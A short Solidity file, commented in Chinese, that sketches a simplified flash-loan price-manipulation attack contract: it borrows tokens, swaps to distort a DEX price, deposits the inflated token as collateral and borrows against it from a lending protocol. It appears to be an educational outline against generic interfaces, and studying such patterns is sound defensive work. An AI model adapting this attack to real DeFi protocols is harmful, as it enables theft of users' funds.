// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @title FlashLoanAttack - 闪电贷攻击简化示意
/// @notice 展示闪电贷攻击的基本框架：借入→操纵价格→获利→还款
contract FlashLoanAttack {
    address public lender;
    address public borrowToken;
    address public targetToken;
    address public dex;
    address public lending;

    // 步骤 1: 接收闪电贷
    function executeFlashLoan(uint256 borrowAmount) external {
        // 从 DEX 借入 Token
        IFlashLender(lender).flashLoan(borrowAmount);

        // 步骤 4: 还款在回调中完成
    }

    // 步骤 2-3: 在回调中执行攻击
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        // 2. 用借来的 Token 大量买入目标 Token，操纵价格
        IDEX(dex).swap(borrowToken, targetToken, amount);

        // 3. 利用操纵后的价格攻击目标协议
        ILending(lending).depositCollateral(targetToken, amount);
        ILending(lending).borrow(borrowToken, amount);

        // 4. 还清闪电贷
        IERC20(borrowToken).approve(lender, amount + fee);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}

interface IFlashLender {
    function flashLoan(uint256 amount) external;
}

interface IDEX {
    function swap(address tokenIn, address tokenOut, uint256 amountIn) external;
}

interface ILending {
    function depositCollateral(address token, uint256 amount) external;
    function borrow(address token, uint256 amount) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}
